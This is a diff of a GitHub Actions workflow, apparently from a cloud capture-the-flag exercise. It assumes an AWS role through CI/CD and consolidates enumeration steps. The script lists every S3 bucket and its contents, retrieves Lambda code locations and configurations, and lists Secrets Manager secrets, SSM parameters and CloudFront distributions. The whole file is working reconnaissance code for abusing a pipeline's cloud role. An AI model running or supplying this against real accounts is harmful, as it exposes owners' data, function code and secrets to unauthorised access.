@@ -1,4 +1,4 @@
-﻿name: corgi-assume
+name: corgi-assume
 on:
   push:
     branches: [corgi]
@@ -19,38 +19,25 @@ jobs:
           aws-region: us-east-1
           role-session-name: cloudescape-corgi
 
-      - name: Identity
+      - name: Enumerate
         run: |
+          set -e
           aws sts get-caller-identity
-          echo "---"
-          aws iam get-role --role-name cicdRole 2>&1 || true
-
-      - name: Enum S3
-        run: |
-          aws s3 ls 2>&1 || true
+          echo "=== S3 buckets ==="
+          aws s3api list-buckets --output json || true
           for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
             echo "==== BUCKET $b ===="
-            aws s3 ls "s3://$b" --recursive 2>&1 | head -200
+            aws s3 ls "s3://$b" --recursive || true
           done
-
-      - name: Enum Lambda
-        run: |
-          aws lambda list-functions --query 'Functions[].{Name:FunctionName,Runtime:Runtime,Role:Role,Handler:Handler}' --output table 2>&1 || true
+          echo "=== Lambda ==="
+          aws lambda list-functions --output json || true
           for fn in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text 2>/dev/null); do
             echo "==== FN $fn ===="
-            aws lambda get-function --function-name "$fn" 2>&1 | head -100
-            aws lambda get-function-configuration --function-name "$fn" 2>&1 | head -80
+            aws lambda get-function --function-name "$fn" --query 'Code.Location' --output text || true
+            aws lambda get-function-configuration --function-name "$fn" --output json || true
           done
-
-      - name: Enum more
-        run: |
-          echo "=== secrets ==="
-          aws secretsmanager list-secrets 2>&1 | head -80 || true
-          echo "=== ssm ==="
-          aws ssm describe-parameters 2>&1 | head -80 || true
-          echo "=== cloudfront ==="
-          aws cloudfront list-distributions --query 'DistributionList.Items[].{Id:Id,Domain:DomainName,Origins:Origins.Items[0].DomainName}' 2>&1 | head -80 || true
-          echo "=== codebuild ==="
-          aws codebuild list-projects 2>&1 || true
-          echo "=== iam roles sample ==="
-          aws iam list-roles --query 'Roles[?contains(RoleName, `cicd`) || contains(RoleName, `flag`) || contains(RoleName, `lambda`)].RoleName' 2>&1 || true
+          echo "=== CloudFront ==="
+          aws cloudfront list-distributions --output json 2>&1 | head -c 100000 || true
+          echo "=== Secrets / SSM ==="
+          aws secretsmanager list-secrets 2>&1 || true
+          aws ssm describe-parameters 2>&1 || true
